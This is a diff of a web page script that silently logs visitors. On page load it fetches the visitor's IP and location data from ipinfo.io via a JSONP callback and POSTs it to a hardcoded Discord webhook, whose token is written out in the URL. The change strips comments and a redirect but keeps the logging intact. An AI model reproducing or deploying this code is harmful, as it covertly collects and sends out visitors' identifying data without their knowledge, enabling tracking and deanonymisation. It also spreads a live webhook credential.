@@ -1,5 +1,6 @@
 <script>
-function monke(json) {
+function monke(json) 
+{
      var request = new XMLHttpRequest();
      
      request.open("POST", "https://discord.com/api/webhooks/1333195920304771132/LNl12HszObTgFfMoaT1ELWK0C1WcMpbLvqWeGXsxlq42eZvWiOtRphuIHYHr9X-PUuig");
@@ -20,12 +21,7 @@ function monke(json) {
           ]
      }
 
-     // Send the webhook data
      request.send(JSON.stringify(params));
-
-     // Redirect to another URL after sending the webhook
-     window.location.href = "https://youtube.com";
 }
 </script>
-
 <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
